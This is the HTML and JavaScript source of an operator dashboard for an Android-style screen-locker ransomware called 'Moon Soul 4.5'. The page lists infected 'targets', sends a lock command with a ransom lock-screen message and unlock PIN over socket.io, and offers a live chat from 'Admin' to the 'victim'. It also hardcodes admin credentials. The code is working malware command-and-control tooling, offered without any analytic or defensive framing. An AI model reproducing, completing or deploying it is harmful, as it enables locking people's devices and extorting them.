<!DOCTYPE html>
<html>
<head>
    <title>Moon Soul 4.5 | Execution</title>
    <style>
        body { background: #050505; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; margin: 0; }
        .sidebar { width: 250px; background: #0a0a0a; height: 100vh; position: fixed; border-right: 1px solid #1a1a1a; }
        .main-content { margin-left: 260px; padding: 20px; }
        .card { background: #111; border: 1px solid #222; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
        .btn-lock { background: #ff003c; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; transition: 0.3s; }
        .btn-lock:hover { background: #b3002a; box-shadow: 0 0 10px #ff003c; }
        input { background: #1a1a1a; border: 1px solid #333; color: #0f0; padding: 8px; border-radius: 4px; width: 100%; box-sizing: border-box; }
        .status-online { color: #00ff41; font-size: 12px; }
    </style>
</head>
<body>
    <div class="sidebar">
        <h3 style="text-align:center; color:#ff003c;">MOON SOUL 4.5</h3>
        <hr border="0.1">
        <div id="targetList" style="padding:10px;">
            <p>Waiting for target...</p>
        </div>
    </div>

    <div class="main-content">
        <div class="card">
            <h2>EXECUTION DASHBOARD</h2>
            <p>Target ID: <span id="activeTarget" style="color:#ff003c">None</span></p>
            <label>Lock Screen Text:</label>
            <input type="text" id="lockText" placeholder="Contoh: DEVICE ENCRYPTED BY MOON SOUL">
            <br><br>
            <label>Set Unlock PIN:</label>
            <input type="text" id="lockPin" placeholder="Contoh: 1234">
            <br><br>
            <button class="btn-lock" onclick="sendLock()">ACTIVATE LOCK DEVICE</button>
        </div>

        <div class="card">
            <h3>LIVE CHAT TO TARGET</h3>
            <div id="chatDisplay" style="height:100px; overflow-y:auto; border:1px solid #333; padding:10px; margin-bottom:10px;"></div>
            <input type="text" id="chatMsg" placeholder="Type message..." onkeypress="handleChat(event)">
        </div>
    </div>

    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <script>
        const socket = io('http://localhost:3000');
        let currentTarget = "";

        // Login Otomatis Admin
        socket.emit('auth', { user: 'Moon4.5', pass: 'soul4.5', code: 'Cv27soul' });

        socket.on('new-target', (data) => {
            const list = document.getElementById('targetList');
            list.innerHTML = `<div onclick="setTarget('${data.id}')" style="cursor:pointer; padding:5px; border:1px solid #333;">📱 ${data.name} <span class="status-online">● Online</span></div>`;
        });

        function setTarget(id) {
            currentTarget = id;
            document.getElementById('activeTarget').innerText = id;
        }

        function sendLock() {
            const text = document.getElementById('lockText').value;
            const pin = document.getElementById('lockPin').value;
            socket.emit('execute-lock', { targetId: currentTarget, text: text, pin: pin });
            alert("Lock Command Sent!");
        }

        function handleChat(e) {
            if(e.key === 'Enter') {
                const msg = document.getElementById('chatMsg').value;
                socket.emit('admin-to-victim-chat', { targetId: currentTarget, message: msg });
                document.getElementById('chatDisplay').innerHTML += `<p>Admin: ${msg}</p>`;
                document.getElementById('chatMsg').value = "";
            }
        }
    </script>
</body>
  </html>
